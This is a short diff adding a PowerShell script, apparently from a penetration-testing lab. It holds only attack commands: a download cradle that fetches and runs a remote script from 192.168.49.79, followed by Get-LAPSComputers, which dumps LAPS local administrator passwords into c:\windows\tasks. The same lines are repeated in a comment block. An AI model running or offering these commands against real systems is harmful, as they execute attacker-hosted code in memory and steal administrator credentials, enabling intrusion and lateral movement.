@@ -1,0 +1,7 @@
+iex(new-object net.webclient).downloadstring('http://192.168.49.79/laps.txt')
+Get-LAPSComputers > c:\windows\tasks\lapsout.txt
+
+<# cmds
+iex(new-object net.webclient).downloadstring('http://192.168.49.79/laps.txt')
+Get-LAPSComputers > c:\windows\tasks\lapsout.txt
+#>
